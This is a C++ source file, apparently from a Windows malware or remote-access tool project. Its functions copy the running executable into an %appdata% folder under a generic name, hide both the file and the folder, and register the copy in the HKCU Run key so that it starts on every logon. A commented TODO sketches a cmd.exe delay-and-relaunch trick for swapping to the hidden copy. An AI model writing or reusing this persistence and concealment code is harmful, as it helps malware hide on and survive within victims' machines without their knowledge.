#include "StartupMethods.h"
#include "GlobalVariables.h"
#include "HelperMethods.h"
#include <Windows.h>



StartupMethods::StartupMethods()
{
}


StartupMethods::~StartupMethods()
{
}


void StartupMethods::AddToStartup() {
	wchar_t path[MAX_PATH];
	GetModuleFileNameW(NULL, path, sizeof(path));
	
	//RemovePathFilename() returns same pointer modified
	//Check if current app path matches the default path, which is %appdata%
	if (!_wcsicmp(HelperMethods::RemovePathFilename(path), AppDefaultDirectory.c_str()) == 0) return; //If not equal
	
	wchar_t path2[MAX_PATH];
	GetModuleFileNameW(NULL, path2, sizeof(path2));

	//GetPathFilename() doesn't need cleanup
	//Adds application to registry startup
	HelperMethods::SetRegistryValue(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", HelperMethods::GetPathFilename(path), path, KEY_SET_VALUE); 
}

void StartupMethods::ChangeAppPath() {
	wchar_t path[MAX_PATH];
	GetModuleFileNameW(NULL, path, sizeof(path));

	const wchar_t* wcharAppDefaultDirectory = AppDefaultDirectory.c_str();

	if (_wcsicmp(HelperMethods::RemovePathFilename(path), AppDefaultDirectory.c_str()) == 0) return; //If equal

	wchar_t path2[MAX_PATH];
	GetModuleFileNameW(NULL, path2, sizeof(path2));

	std::wstring pathToCopyTo(AppDefaultDirectory + L"\\name.exe");
	const wchar_t* wcharPathToCopyTo = pathToCopyTo.c_str();

	DeleteFileW(wcharPathToCopyTo); //test if this can delete hidden files
	CreateDirectoryW(AppDefaultDirectory.c_str(), NULL);
	CopyFileW(path2, wcharPathToCopyTo, FALSE);

	SetFileAttributesW(wcharPathToCopyTo, FILE_ATTRIBUTE_HIDDEN);
	SetFileAttributesW(AppDefaultDirectory.c_str(), FILE_ATTRIBUTE_HIDDEN);

	//TODO:
	/* ProcessStartInfo procStartInfo = new ProcessStartInfo
	{
		FileName = "cmd.exe",
		Arguments = string.Format(@"/c ping 1.1.1.1 - n 1 - w 5000 > NUL & start """" ""{0}""", pathToCopy),
			UseShellExecute = false,
			CreateNoWindow = true
	};

	Process.Start(procStartInfo);
	Application.Exit();
	*/
}

// + L"\\name.exe"